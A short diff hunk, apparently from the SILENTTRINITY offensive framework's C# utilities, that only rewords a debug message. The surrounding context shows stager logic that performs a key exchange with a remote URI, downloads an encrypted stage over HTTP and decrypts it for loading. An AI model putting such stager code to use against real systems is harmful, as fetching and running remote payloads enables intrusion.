@@ -47,7 +47,7 @@ namespace SILENTTRINITY.Utilities
                 var key = Crypto.KeyExchange(uri);
                 var stage = Crypto.Decrypt(key, Http.Get(uri));
 #if DEBUG
-                Console.WriteLine("The keys worked! The intial stage was decrypted succefully");
+                Console.WriteLine("The keys worked! The intial stage was successfully decrypted!");
 #endif
                 return new MemoryStream(stage);
             }
